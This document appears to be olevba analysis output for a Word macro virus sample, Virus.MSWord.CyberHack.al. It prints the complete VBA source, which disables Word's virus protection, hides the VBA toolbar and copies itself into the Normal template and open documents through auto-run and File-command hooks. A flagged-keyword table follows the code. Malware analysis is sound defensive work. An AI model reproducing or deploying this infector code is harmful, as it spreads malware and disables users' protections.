olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack.al-6214087365e19a1af531700413757b0dede0f6d8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack.al-6214087365e19a1af531700413757b0dede0f6d8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jiuster.bas 
in file: Virus.MSWord.CyberHack.al-6214087365e19a1af531700413757b0dede0f6d8 - OLE stream: 'Macros/VBA/Jiuster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'No Modifique Nada Causaras Errores Att. Jiuster  SuperXtar@Usa.Net
'Si Quieres Aprender Contactame Via E.Mail
'Abstenerse Lamer's como tu
Public Jiustea1
Public Jiustea
Public Jiustez
Sub Seli()
    Jiustex = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Idat
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
     On Error GoTo 0
End Sub
Sub HolaIDAT()
Application.DisplayAlerts = Jiustex
End Sub
Sub Experto()
    On Error GoTo Jiu2
    Jiustea1 = 0
    Jiustez = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
       If Jiustez = False Then
      On Error GoTo Jit2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "Jiuster", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "Jiuster4", Object:=wdOrganizerObjectProjectItems
      Jiustea1 = 1
Jit2:
    End If
Jiu2:
End Sub
Sub JiusterSoft()
    Call Idat
    On Error GoTo Jiu1
    Jiustea = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Jit1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
    Next i
Jit1a:
    If Jiustea = False Then
      On Error GoTo Jit1
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "Jiuster", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "Jiuster4", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Jit1:
    End If
Jiu1:
End Sub
Sub LOMAXIMO()
    Call Seli
    Call JiusterSoft
    Call HolaIDAT
End Sub
Sub Idat()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Hacker()
    On Error GoTo Jit4
Set Ad = ActiveDocument
    If Jiustea1 = 1 Then
       Ad.SaveAs FileName:=Ad.Name, FileFormat:=wdFormatDocument
    End If
Jit4:
End Sub
Sub AutoOpen()
    Call LOMAXIMO
End Sub
Sub AutoClose()
    Call Seli
    Call JiusterSoft
   Call Experto
    Call HolaIDAT
    ActiveDocument.SaveAs
    Call LOMAXIMO
 End Sub
Sub FileClose()
    Call Seli
    Call JiusterSoft
    Call Experto
    Call HolaIDAT
   ActiveDocument.SaveAs
   Call LOMAXIMO
   End Sub
Sub FileOpen()
    Call LOMAXIMO
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    Call Seli
    Call Experto
    Call Hacker
    Call HolaIDAT
End Sub
Sub FileSaveAs()
    Call Seli
    Call JiusterSoft
    Call Experto
    Call HolaIDAT
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub HelpAbout()
    On Error GoTo Jiu3
      Jiuster4.Show
Jiu3:
Call LOMAXIMO
End Sub

Sub HerramMacro()
    On Error GoTo Jiu3
    Jiuster4.Show
Application.OnTime Now + TimeValue("00:30:00"), "JiusVisual"
Jiu3:
    Call LOMAXIMO
End Sub

Sub FileExit()
    Call Seli
    Call JiusterSoft
    Call Experto
    On Error GoTo Jiu4
    If WeekDay(Date) = 5 Then Jiuster4.Show
Jiu4:
    Call HolaIDAT
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call LOMAXIMO
End Sub
Sub FileNew()
    Call LOMAXIMO
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
On Error Resume Next
Call LOMAXIMO
End Sub
Sub ToolsCustomize()
On Error Resume Next
Call LOMAXIMO
End Sub
Sub ToolsCustomizeKeyboard()
    Call LOMAXIMO
End Sub
Sub ViewVBCode()
Jiuster4.Show
    Call LOMAXIMO
End Sub
Sub Organizer()
End Sub
Public Sub JiusVisual()
On Error Resume Next
Documents.Add
ActiveDocument.Background.Fill.ForeColor.RGB = RGB(0, 0, 0)
    ActiveDocument.Background.Fill.Visible = msoTrue
    ActiveDocument.Background.Fill.Solid
    ActiveWindow.View.Type = wdOnlineView
    With Selection.Font
        .Name = "Arial Black"
        .Size = 25
        .Bold = True
        .ColorIndex = wdRed
       End With
    Selection.TypeText Text:="THE ANGEL GABRIELL"
    Selection.MoveLeft Unit:=wdCharacter, Count:=8, Extend:=wdExtend
    With Selection.Font
        .Name = "Arial Black"
        .Size = 30
        .Bold = True
        .ColorIndex = wdRed
        .Animation = wdAnimationBlinkingBackground
    End With
    Selection.EndKey Unit:=wdLine
    With Selection.Font
        .Name = "Arial Black"
        .Size = 30
        .Bold = True
        .ColorIndex = wdBlue
        .Animation = wdAnimationNone
    End With
    Selection.Font.Size = 20
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.Size = 25
    Selection.TypeText Text:="TU SUEÑO SE HIZO REALIDAD"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.Size = 30
    With Selection.Font
        .Name = "Arial Black"
        .Size = 35
        .Bold = True
        .ColorIndex = wdWhite
        .Animation = wdAnimationNone
    End With
    Selection.TypeText Text:="Virus> JIUSTER"
       Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.Size = 25
     With Selection.Font
        .Name = "Arial Black"
        .Size = 30
        .Bold = True
        .ColorIndex = wdYellow
        .Animation = wdAnimationNone
    End With
    Selection.TypeText Text:="GABRIELL>  ;-), :-D"
    Selection.Font.Size = 20
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="The Angel Gabriell >J.O.N.    E.Mail:  SUPERXTAR@USA.NET"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:="El CiberSpace Es El FireWall Que Me Divide De Lo Real"
      ActiveDocument.SaveAs
End Sub


-------------------------------------------------------------------------------
VBA MACRO Jiuster4.frm 
in file: Virus.MSWord.CyberHack.al-6214087365e19a1af531700413757b0dede0f6d8 - OLE stream: 'Macros/VBA/Jiuster4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
















































'No Modifique Nada Causaras Errores Att. Jiuster SuperXtar@Usa.Net
'Si Quieres Aprender Contactame Via E.Mail
'Abstenerse Lamer's como tu
Dim Jter As Integer
Private Sub Seli()
      If Jter = 0 Then
        Idat.Picture = Idat1.Picture
        Jter = 1
    Else
        Idat.Picture = Idat2.Picture
        Jter = 0
    End If
End Sub
Private Sub IeTimer1_Timer()
Seli
End Sub
Private Sub IeTimer2_Timer()
    IeTimer2.Tag = Mid(IeTimer2.Tag, 2) + Left(IeTimer2.Tag, 1)
            Jiuster4.Caption = IeTimer2.Tag
        BackColor = &HFFFFFF * Rnd
End Sub
Private Sub IeTimer3_Timer()
        IeTimer3.Tag = Mid(IeTimer3.Tag, 2) + Left(IeTimer3.Tag, 1)
            Jiuster3.Caption = IeTimer3.Tag
End Sub
Private Sub Jiuster2_Click()
Unload Me
End Sub
Private Sub Jiuster1_Click()
On Error Resume Next
        Dim retval
            retval = Shell("C:\windows\Sol.EXE", 1)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Jiuster2_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Sol.EXE             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

